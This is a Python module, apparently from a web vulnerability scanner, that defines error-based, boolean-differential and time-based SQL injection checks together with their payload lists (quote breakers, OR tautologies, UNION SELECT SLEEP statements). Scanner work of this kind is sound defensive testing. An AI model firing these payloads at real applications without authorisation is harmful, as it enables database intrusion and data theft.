import string
from ava.common import utility
from ava.common.check import _ValueCheck, _DifferentialCheck, _TimingCheck

# metadata
name = __name__
description = "checks for sql injection"


class SqlInjectionCheck(_ValueCheck):
    """
    Checks for SQL Injection by causing a syntax error. The payloads are special characters and single values. It
    looks for a response with a status code of 500 and a stack trace containing a SQL exception.
    """
    key = "sql.value.error"
    name = "SQL Injection"
    description = "checks for sql injection by causing syntax errors"
    example = "'"

    def __init__(self):
        """Define static payloads"""
        self._payloads = [
            "'",
            '"',
            '(',
            ')',
            "NULL",
            utility.generate_random(string.ascii_lowercase, size=5),
            utility.generate_random(string.digits, size=4),
            "--"
        ]

    def check(self, response, payload):
        """
        Checks for SQL Injection by looking for a response with a status code of 500 and a stack trace containing
        a SQL exception.
        :param response: response object
        :param payload: payload value
        :return: true if vulnerable, false otherwise
        """
        # check response body
        if not response.text:
            return False

        # check status code
        if response.status_code != 500:
            return False

        # check SQL exception
        if "sqlexception" in response.text.lower():
            return True
        else:
            return False


class SqlInjectionDifferentialCheck(_DifferentialCheck):
    """
    Checks for SQL Injection in the response's HTML body.  The payloads are true and false values. The true value is
    OR 1=1, and the false value is AND 1=0. The checks uses the differential threshold to identify an issue.
    """
    key = "sql.differential.row"
    name = "SQL Injection Differential"
    description = "checks for sql injection in response body"

    def __init__(self):
        """Define static payloads"""
        payloads = [
            # AND
            ("' AND '{}'='{}", "' AND '{}'='!{}"),
            ("' AND '{}'='{}' -- ", "' AND '{}'='!{}' -- "),
            ("' AND '{}'='{}' #", "' AND '{}'='!{}' #"),
            # OR
            ("' OR '{}'='{}", "' AND '{}'='!{}"),
            ("' OR '{}'='{}' -- ", "' AND '{}'='!{}' -- "),
            ("' OR '{}'='{}' #", "' AND '{}'='!{}' #"),
            # like
            ("%' AND '%'='", "%' AND '%'='!"),
            ("%' OR '%'='", "%' AND '%'='!"),
            # double quotes
            ('" OR "{}"="{}', '" AND "{}"="!{}'),
            ('" OR "{}"="{}" -- ', '" AND "{}"="!{}" -- '),
            ('" OR "{}"="{}" #', '" AND "{}"="!{}" #'),
            # integer
            ("1 OR 1221=1221", "1 AND 1221=2112"),
            # parentheses
            ("') AND ('{}'='{}", "') AND ('{}'='!{}"),
            ("') OR ('{}'='{}", "') AND ('{}'='!{}")
        ]
        
        # generate random and add to payloads
        self._random = utility.generate_random(string.ascii_lowercase, size=4)
        self._payloads = [(true.format(self._random, self._random), false.format(self._random, self._random))
                          for true, false in payloads]


class SqlInjectionTimingCheck(_TimingCheck):
    """
    Checks for SQL Injection by executing the 'sleep' command. The payload uses a UNION SELECT statement to execute
    'sleep'. Null values are included to match the columns of the original SQL statement.
    """
    key = "sql.timing.sleep"
    name = "SQL Injection Timing"
    description = "checks for sql injection by executing delays"
    example = "' UNION SELECT SLEEP(9) -- "

    def __init__(self):
        """Define static payloads"""
        payloads = [
            # single quotes
            ("' UNION SELECT SLEEP(9) -- ", 9.00),
            ("' UNION SELECT null,SLEEP(9) -- ", 9.00),
            ("' UNION SELECT null,null,SLEEP(9) -- ", 9.00),
            ("' UNION SELECT null,null,null,SLEEP(9) -- ", 9.00),
            ("' UNION SELECT null,null,null,null,SLEEP(9) -- ", 9.00),
            # double quotes
            ('" UNION SELECT SLEEP(9) -- ', 9.00),
            ('" UNION SELECT null,SLEEP(9) -- ', 9.00),
            ('" UNION SELECT null,null,SLEEP(9) -- ', 9.00),
            ('" UNION SELECT null,null,null,SLEEP(9) -- ', 9.00),
            ('" UNION SELECT null,null,null,null,SLEEP(9) -- ', 9.00),
            # integer
            ("1 UNION SELECT SLEEP(9) -- ", 9.00),
            ("1 UNION SELECT null,SLEEP(9) -- ", 9.00),
            ("1 UNION SELECT null,null,SLEEP(9) -- ", 9.00),
            ("1 UNION SELECT null,null,null,SLEEP(9) -- ", 9.00),
            ("1 UNION SELECT null,null,null,null,SLEEP(9) -- ", 9.00),
            # operator
            ("' AND SLEEP(9) AND '{}'='{}", 9.00),
            ("' OR SLEEP(9) AND '{}'='{}", 9.00),
            ("') AND SLEEP(9) AND ('{}'='{}", 9.00),
            ("') OR SLEEP(9) AND ('{}'='{}", 9.00)
        ]
        
        # generate random and add to payloads
        self._random = utility.generate_random(string.ascii_lowercase, size=4)
        self._payloads = [(payload.format(self._random, self._random), delay) for payload, delay in payloads]
